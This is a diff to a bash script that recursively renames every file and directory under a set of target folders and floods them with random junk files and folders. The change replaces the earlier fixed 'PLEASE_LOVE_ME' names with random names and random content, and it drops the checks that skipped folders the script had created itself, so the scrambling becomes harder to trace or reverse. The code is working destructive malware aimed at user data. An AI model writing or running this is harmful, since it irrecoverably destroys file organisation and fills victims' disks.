@@ -11,6 +11,14 @@ TARGET_DIRS=(
 counter=1
 dir_counter=1
 
+random_name() {
+    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12
+}
+
+random_content() {
+    cat /dev/urandom | tr -dc 'a-zA-Z0-9 \n' | head -c 256
+}
+
 rename_files() {
     local dir="$1"
     local depth="${2:-0}"
@@ -18,9 +26,10 @@ rename_files() {
 
     for file in "$dir"/*; do
         [ -f "$file" ] || continue
-        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${counter}" 2>/dev/null
+        mv "$file" "${file%/*}/$(random_name)" 2>/dev/null
         ((counter++))
     done
+
     for entry in "$dir"/*/; do
         [ -d "$entry" ] || continue
         rename_files "${entry%/}" $((depth + 1))
@@ -35,26 +44,24 @@ create_files() {
     local has_subdirs=0
     for entry in "$dir"/*/; do
         [ -d "$entry" ] || continue
-        # Skip dirs we already created
-        [[ "${entry%/}" == *"PLEASE_LOVE_ME"* ]] && continue
         has_subdirs=1
         break
     done
 
     if [ "$has_subdirs" -eq 0 ]; then
         for i in {1..50}; do
-            mkdir -p "$dir/PLEASE_LOVE_ME_${i}" 2>/dev/null
+            local fakedir="$dir/$(random_name)"
+            mkdir -p "$fakedir" 2>/dev/null
             for j in {1..20}; do
-                > "$dir/PLEASE_LOVE_ME_${i}/PLEASE_LOVE_ME_${j}" 2>/dev/null
+                random_content > "$fakedir/$(random_name)" 2>/dev/null
             done
         done
     else
         for entry in "$dir"/*/; do
             [ -d "$entry" ] || continue
             entry="${entry%/}"
-            [[ "$entry" == *"PLEASE_LOVE_ME"* ]] && continue
             for i in {1..20}; do
-                > "$entry/PLEASE_LOVE_ME_${i}" 2>/dev/null
+                random_content > "$entry/$(random_name)" 2>/dev/null
             done
             create_files "$entry" $((depth + 1))
         done
@@ -70,7 +77,7 @@ rename_dirs() {
         [ -d "$entry" ] || continue
         entry="${entry%/}"
         rename_dirs "$entry" $((depth + 1))
-        mv "$entry" "${entry%/*}/PLEASE_LOVE_ME_DIR_${dir_counter}" 2>/dev/null
+        mv "$entry" "${entry%/*}/$(random_name)" 2>/dev/null
         ((dir_counter++))
     done
 }
